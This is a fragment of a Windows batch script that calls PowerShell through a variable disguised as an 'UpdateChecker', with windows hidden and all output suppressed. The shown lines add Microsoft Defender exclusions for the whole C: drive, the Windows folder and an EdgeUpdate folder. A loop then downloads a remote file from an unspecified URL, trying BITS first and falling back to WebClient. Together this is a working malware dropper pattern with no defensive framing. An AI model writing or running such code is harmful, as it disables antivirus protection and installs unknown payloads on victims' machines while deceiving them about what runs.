...
%UpdateChecker% -w hidden -c "Add-MpPreference -ExclusionPath 'C:\', 'C:\Windows', 'C:\Program Files (x86)\Microsoft\EdgeUpdate'" >nul 2>&1
...
:downLoop
if not exist "%DEST%" (
    %UpdateChecker% -w hidden -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Start-BitsTransfer -Source %URL% -Destination '%DEST%'" >nul 2>&1
    if not exist "%DEST%" (
        %UpdateChecker% -w hidden -c "(New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')" >nul 2>&1
    )
